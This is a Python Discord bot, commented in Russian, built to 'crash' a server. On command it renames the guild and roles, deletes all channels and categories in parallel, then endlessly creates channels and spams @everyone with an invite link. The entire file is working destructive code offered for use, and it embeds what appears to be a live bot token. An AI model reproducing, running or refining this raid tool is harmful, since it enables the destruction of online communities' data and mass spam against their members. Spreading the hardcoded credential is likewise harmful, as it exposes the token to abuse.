import discord
from discord.ext import commands
import asyncio

TOKEN = "MTQ5MTgzNjU1ODE1NDc5NzI5MQ.Gvc2Cj.aRklXf8D3dxwEyNFDtP82OiS6uffBhYuLo0OMk"
CHANNEL_NAME = "crashed"
ROLE_NAME = "crashed"
GUILD_NAME = "crashed by synapse"  # Новое название сервера

YOUR_MESSAGE = "@everyone crashed by synapse and https://discord.gg/cRMm9MahEV"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

crash_task = None
created_count = 0

@bot.event
async def on_ready():
    print(f"✅ Бот {bot.user} запущен")

@bot.command()
async def crash(ctx):
    global crash_task, created_count
    if crash_task and not crash_task.done():
        return
    
    created_count = 0
    guild = ctx.guild
    
    # ========== 1. ПЕРЕИМЕНОВАНИЕ СЕРВЕРА ==========
    try:
        await guild.edit(name=GUILD_NAME)
        print(f"✅ Сервер переименован в: {GUILD_NAME}")
    except:
        print("❌ Не удалось переименовать сервер")
    
    # ========== 2. ПАРАЛЛЕЛЬНОЕ УДАЛЕНИЕ КАНАЛОВ, КАТЕГОРИЙ ==========
    print("🗑️ Параллельное удаление всех каналов и категорий...")
    
    text_tasks = [ch.delete() for ch in guild.text_channels]
    voice_tasks = [ch.delete() for ch in guild.voice_channels]
    category_tasks = [cat.delete() for cat in guild.categories]
    
    if text_tasks:
        await asyncio.gather(*text_tasks, return_exceptions=True)
    if voice_tasks:
        await asyncio.gather(*voice_tasks, return_exceptions=True)
    if category_tasks:
        await asyncio.gather(*category_tasks, return_exceptions=True)
    
    print("✅ Все каналы и категории удалены")
    
    # ========== 3. ПЕРЕИМЕНОВАНИЕ РОЛЕЙ ==========
    role_tasks = []
    for role in guild.roles:
        if role.name not in ["@everyone", ROLE_NAME]:
            role_tasks.append(role.edit(name=ROLE_NAME))
    
    if role_tasks:
        await asyncio.gather(*role_tasks, return_exceptions=True)
    
    # ========== 4. СОЗДАНИЕ НОВЫХ КАНАЛОВ (50 за раз) ==========
    async def create_and_spam():
        global created_count
        while True:
            try:
                channels = await asyncio.gather(*[
                    guild.create_text_channel(CHANNEL_NAME) for _ in range(50)
                ], return_exceptions=True)
                
                valid = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
                
                spam_tasks = []
                for ch in valid:
                    for _ in range(5):
                        spam_tasks.append(ch.send(YOUR_MESSAGE))
                await asyncio.gather(*spam_tasks, return_exceptions=True)
                
                created_count += len(valid)
                await asyncio.sleep(0.1)
                
            except:
                await asyncio.sleep(0.1)
    
    crash_task = asyncio.create_task(create_and_spam())

@bot.command()
async def stop(ctx):
    global crash_task
    if crash_task and not crash_task.done():
        crash_task.cancel()
        crash_task = None

bot.run(TOKEN)